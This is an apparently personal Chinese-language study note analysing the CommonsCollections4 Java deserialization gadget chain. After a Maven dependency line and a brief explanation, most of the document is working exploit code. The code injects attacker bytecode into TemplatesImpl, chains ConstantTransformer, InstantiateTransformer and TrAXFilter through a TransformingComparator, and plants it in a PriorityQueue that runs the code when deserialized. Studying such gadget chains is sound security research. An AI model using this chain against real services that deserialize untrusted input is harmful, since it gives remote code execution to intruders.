# CommonsCollections4分析

## 1.环境搭建

```
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-collections4</artifactId>
    <version>4.1</version>
</dependency>
```

## 2.调试分析

当 commons-collections4 > 4.0 时，`InvokerTransformer`类，没有实现Serialize接口，导致无法反序列化，只能采取其它方式代替，这里可以使用CC3提到的`InstantiateTransformer#transform(...)`来触发`xx.newInstance(...)`。

构造exp，代码如下：

```java
  TemplatesImpl templates = new TemplatesImpl();
  Class templatesClass = templates.getClass();
  Field name = templatesClass.getDeclaredField("_name");
  name.setAccessible(true);
  name.set(templates,"123");

  Field byteCodes = templatesClass.getDeclaredField("_bytecodes");
  byteCodes.setAccessible(true);
  byte[] code = Files.readAllBytes(Paths.get("/Users/me7eorite/Documents/GitHub/Learning-Demo/JavaStudy/target/classes/com/learning/security/serialization/commons/Exp.class"));
  byteCodes.set(templates,new byte[][]{code});

  Field tfactory = templatesClass.getDeclaredField("_tfactory");
  tfactory.setAccessible(true);
  tfactory.set(templates,new TransformerFactoryImpl());


  ChainedTransformer chainedTransformer = new ChainedTransformer<>( new Transformer[]{
          new ConstantTransformer(TrAXFilter.class),
          new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
  });

  TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer);

  PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);
  Class priorityClass = priorityQueue.getClass();
  Field size = priorityClass.getDeclaredField("size");
  size.setAccessible(true);
  size.set(priorityQueue,2);
  byte[] serialize = serialize(priorityQueue);
  unSerialize(serialize);
```

















